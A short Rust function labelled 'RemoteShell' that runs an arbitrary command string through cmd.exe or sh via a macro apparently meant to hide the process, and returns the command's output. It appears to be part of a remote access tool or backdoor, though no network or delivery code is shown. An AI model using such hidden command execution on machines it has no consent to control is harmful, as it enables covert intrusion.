
pub fn execute_command(cmd: &str) -> Result<String, String> {
    println!("[RemoteShell] Executing command: {}", cmd);
    
    #[cfg(windows)]
    let result = crate::hidden_command!("cmd.exe")
        .args(&["/c", cmd])
        .output();
    
    #[cfg(not(windows))]
    let result = crate::hidden_command!("sh")
        .arg("-c")
        .arg(cmd)
        .output();
    
    match result {
        Ok(output) => {
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            
            if !stderr.is_empty() {
                Ok(format!("{}\n[stderr]\n{}", stdout, stderr))
            } else {
                Ok(stdout)
            }
        },
        Err(e) => Err(format!("Failed to execute command: {}", e))
    }
}
